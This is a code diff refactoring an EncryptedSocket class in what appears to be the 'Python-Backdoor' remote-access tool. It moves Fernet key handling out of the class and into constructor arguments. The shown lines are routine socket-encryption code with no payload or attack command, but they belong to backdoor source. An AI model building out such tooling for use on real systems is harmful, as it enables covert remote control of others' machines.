@@ -8,19 +8,16 @@ license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 import json
 import logging
 
-from cryptography.fernet import Fernet
-
 from src.definitions.commands import OK_SENDALL
 from src.logger import LOGGER_ID
 
 BUFFER = 1024
 
 
-class EncryptedSocket(object):
-    def __init__(self):
-        self.key = None
-        self.encryptor = None
-        self.socket = None
+class EncryptedSocket:
+    def __init__(self, socket, fernet):
+        self.encryptor = fernet
+        self.socket = socket
         self.logger = logging.getLogger(LOGGER_ID)
 
     def close(self):
@@ -95,11 +92,3 @@ class EncryptedSocket(object):
             return
 
         self.send(data, False)
-
-    def set_key(self, key):
-        self.key = key
-        self.encryptor = Fernet(self.key)
-
-    def new_key(self):
-        self.key = Fernet.generate_key()
-        self.encryptor = Fernet(self.key)
